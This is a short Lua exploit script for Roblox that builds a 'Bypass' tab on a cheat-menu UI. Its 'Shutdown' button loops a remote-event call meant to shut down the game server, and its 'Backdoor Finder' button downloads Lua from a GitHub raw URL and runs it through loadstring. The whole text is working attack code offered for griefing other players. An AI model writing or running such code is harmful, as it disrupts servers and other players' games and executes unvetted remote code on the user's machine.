local bypassTab = Luxt:Tab("Bypass")
local iv = bypassTab:Section("Bypasser")
iv:Button("Shutdown", function()

Notify({
Description = "Executed Shutdown.exe";
Duration = 5;
});

wait(7)

while true do
    game.Workspace.BasicCommand:FireServer(7, "Shutting down server...", 5.5, 1.5, true, "Server has been shutdown.")
wait()
end
end)
iv:Button("Backdoor Finder", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
end)
